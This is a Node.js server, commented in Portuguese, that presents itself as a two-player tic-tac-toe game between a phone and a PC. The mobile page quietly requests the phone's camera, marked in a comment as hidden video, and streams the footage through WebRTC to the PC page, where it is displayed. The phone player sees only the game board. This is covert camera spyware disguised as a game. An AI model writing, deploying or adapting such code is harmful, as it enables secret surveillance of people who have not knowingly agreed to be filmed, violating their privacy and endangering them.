const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(req.headers['user-agent']);
  
  if (isMobile) {
    // Página do CELULAR - só vídeo oculto
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Jogo da Velha</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #f0f0f0; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        h1 { color: #333; }
        .status { padding: 10px; margin: 10px 0; background: #e3f2fd; border-radius: 5px; }
        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .cell { background: #f8f9fa; border: 2px solid #dee2e6; aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-size: 48px; cursor: pointer; }
        button { padding: 15px 30px; font-size: 18px; background: #4CAF50; color: white; border: none; border-radius: 5px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Jogo da Velha</h1>
        <div class="status" id="status">Aguardando...</div>
        <div class="board" id="board"></div>
        <button id="reset">Reiniciar</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let board = ['','','','','','','','',''];
        let minhaVez = false;
        
        // Criar tabuleiro
        for(let i=0; i<9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.onclick = () => {
                if(minhaVez && board[i]==='') socket.emit('jogada', i);
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Vídeo oculto (só imagem, sem áudio)
        async function iniciarVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 320, height: 240 } // só vídeo, sem áudio
                });
                
                const peer = new RTCPeerConnection();
                stream.getVideoTracks().forEach(track => peer.addTrack(track, stream));
                
                peer.onicecandidate = e => e.candidate && socket.emit('candidate', e.candidate);
                peer.onnegotiationneeded = async () => {
                    const offer = await peer.createOffer();
                    await peer.setLocalDescription(offer);
                    socket.emit('offer', offer);
                };
                
                socket.on('answer', async a => await peer.setRemoteDescription(a));
                socket.on('candidate', async c => { try{await peer.addIceCandidate(c)}catch(e){} });
            } catch(e) { console.log('Erro vídeo:', e); }
        }
        iniciarVideo();
        
        socket.on('inicio', d => {
            minhaVez = d.vez === 'O';
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do PC';
        });
        
        socket.on('jogada', d => {
            document.getElementsByClassName('cell')[d.pos].innerHTML = d.simbolo;
            minhaVez = !minhaVez;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do PC';
        });
        
        socket.on('fim', d => document.getElementById('status').innerHTML = d.msg);
        
        socket.on('reiniciar', () => {
            document.querySelectorAll('.cell').forEach(c => c.innerHTML='');
            minhaVez = false;
        });
        
        document.getElementById('reset').onclick = () => socket.emit('reiniciar');
    </script>
</body>
</html>
    `);
  } else {
    // Página do PC - mostra vídeo + jogo
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>PC - Jogo da Velha</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        video { width: 100%; background: black; border-radius: 5px; }
        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .cell { background: #f8f9fa; border: 2px solid #dee2e6; aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-size: 48px; cursor: pointer; }
        button { padding: 10px 20px; margin: 5px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div>
            <video id="video" autoplay playsinline></video>
        </div>
        <div>
            <h1>Jogo da Velha</h1>
            <div class="status" id="status">Aguardando...</div>
            <div class="board" id="board"></div>
            <button id="reset">Reiniciar</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let board = ['','','','','','','','',''];
        let minhaVez = true;
        
        for(let i=0; i<9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.onclick = () => {
                if(minhaVez && board[i]==='') socket.emit('jogada', i);
            };
            document.getElementById('board').appendChild(cell);
        }
        
        const peer = new RTCPeerConnection();
        const video = document.getElementById('video');
        
        peer.ontrack = e => video.srcObject = e.streams[0];
        peer.onicecandidate = e => e.candidate && socket.emit('candidate', e.candidate);
        
        socket.on('offer', async o => {
            await peer.setRemoteDescription(o);
            const a = await peer.createAnswer();
            await peer.setLocalDescription(a);
            socket.emit('answer', a);
        });
        
        socket.on('candidate', async c => { try{await peer.addIceCandidate(c)}catch(e){} });
        
        socket.on('inicio', () => {
            document.getElementById('status').innerHTML = 'Sua vez';
        });
        
        socket.on('jogada', d => {
            document.getElementsByClassName('cell')[d.pos].innerHTML = d.simbolo;
            minhaVez = !minhaVez;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
        });
        
        socket.on('fim', d => document.getElementById('status').innerHTML = d.msg);
        
        socket.on('reiniciar', () => {
            document.querySelectorAll('.cell').forEach(c => c.innerHTML='');
            minhaVez = true;
        });
        
        document.getElementById('reset').onclick = () => socket.emit('reiniciar');
    </script>
</body>
</html>
    `);
  }
});

// Lógica do jogo
let board = ['','','','','','','','',''];
let vez = 'X';
let pc = null, mobile = null;

function checkWinner() {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for(let l of lines) if(board[l[0]] && board[l[0]]==board[l[1]] && board[l[0]]==board[l[2]]) return board[l[0]];
  return null;
}

io.on('connection', s => {
  console.log('Conectado:', s.id);
  
  if(!pc) { pc = s.id; s.emit('inicio', {vez:'X'}); }
  else if(!mobile) { mobile = s.id; s.emit('inicio', {vez:'O'}); }
  
  s.on('offer', o => s.broadcast.emit('offer', o));
  s.on('answer', a => s.broadcast.emit('answer', a));
  s.on('candidate', c => s.broadcast.emit('candidate', c));
  
  s.on('jogada', pos => {
    let jogador = s.id==pc ? 'X' : 'O';
    if(jogador!=vez || board[pos]!='') return;
    
    board[pos] = jogador;
    let vencedor = checkWinner();
    
    if(vencedor) io.emit('fim', {msg: \`\${vencedor} venceu!\`});
    else if(!board.includes('')) io.emit('fim', {msg:'Empate!'});
    else vez = vez=='X'?'O':'X';
    
    io.emit('jogada', {pos, simbolo:jogador});
  });
  
  s.on('reiniciar', () => {
    board = ['','','','','','','','',''];
    vez = 'X';
    io.emit('reiniciar');
  });
  
  s.on('disconnect', () => {
    if(s.id==pc) pc=null;
    if(s.id==mobile) mobile=null;
    board = ['','','','','','','','',''];
    vez='X';
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('Servidor rodando na porta', PORT);
});
